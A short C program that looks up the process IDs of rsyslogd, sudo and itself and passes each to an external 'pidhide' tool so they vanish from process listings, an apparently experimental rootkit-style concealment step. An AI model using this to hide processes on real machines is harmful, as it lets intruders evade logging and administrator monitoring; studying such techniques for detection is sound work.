#define _XOPEN_SOURCE 500  // Enable certain library features
#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include<signal.h>
#include <unistd.h>
#include <curl/curl.h>
#include <jansson.h>

void find_pid_by_name(const char *program_name, int **found_pids) {
    char command[256];
    snprintf(command, sizeof(command), "pidof %s", program_name);

    FILE *fp = popen(command, "r");
    if (!fp) {
        perror("popen");
        exit(1);
    }

    char buffer[512];
    if (fgets(buffer, sizeof(buffer), fp)) {
        int pid_count = 0;
        for (char *token = strtok(buffer, " "); token; token = strtok(NULL, " ")) {
            *found_pids = realloc(*found_pids, (pid_count + 2) * sizeof(int));
            (*found_pids)[pid_count++] = atoi(token);
        }
        (*found_pids)[pid_count] = -1;
    }
    pclose(fp);
}
// Function to hide PIDs
void hide_pids(int *pids) {
    for (int i = 0; pids[i] != -1; ++i) {
        printf("Hiding PID: %d\n", pids[i]);
        char pid_str[64];
        snprintf(pid_str, sizeof(pid_str), "%d", pids[i]);
        
        pid_t hide_each_pid = fork();
        if (hide_each_pid == 0) {  // Child process
            execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
            exit(0);  // Exit child process
        } else if (hide_each_pid < 0) {  // Fork failed
            perror("fork");
            exit(1);
        }
    }
}

void combine_and_hide_pids(const char *names[], int num_names) {
    int *combined_pids = NULL;
    int combined_count = 0;

    for (int i = 0; i < num_names; ++i) {
        int *found_pids = NULL;
        find_pid_by_name(names[i], &found_pids);

        // Append found_pids to combined_pids
        for (int j = 0; found_pids[j] != -1; ++j) {
            combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
            combined_pids[combined_count++] = found_pids[j];
        }

        free(found_pids);  // Don't forget to free the memory
    }

    // Add the terminator
    combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
    combined_pids[combined_count] = -1;

    // Hide the combined PIDs
    hide_pids(combined_pids);

    free(combined_pids);  // Free the combined array
}



int main() {
    const char *names[] = {"rsyslogd", "a.out", "sudo"};
    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));

    exit(0);  // Make sure to exit the child process
    //pid_t parent_pid = getpid();  // Get the parent PID before forking
    //pid_t pid = fork();  // Fork the process

    //if (pid == 0) {
    //    // This block will be executed by the child process
    //    printf("I am the child, my PID is %d and my parent's PID is %d\n", getpid(), getppid());
    //    printf("Parent PID stored before fork: %d\n", parent_pid);
    //    exit(0);  // Exit the child process
    //} else if (pid > 0) {
    //    // This block will be executed by the parent process
    //    printf("I am the parent, my PID is %d and my child's PID is %d\n", getpid(), pid);

    //    // Infinite loop to keep the parent process running
    //    while (1) {
    //        sleep(1);
    //    }
    //} else {
    //    // Fork failed
    //    perror("fork");
    //    exit(1);
    //}

    //return 0;
}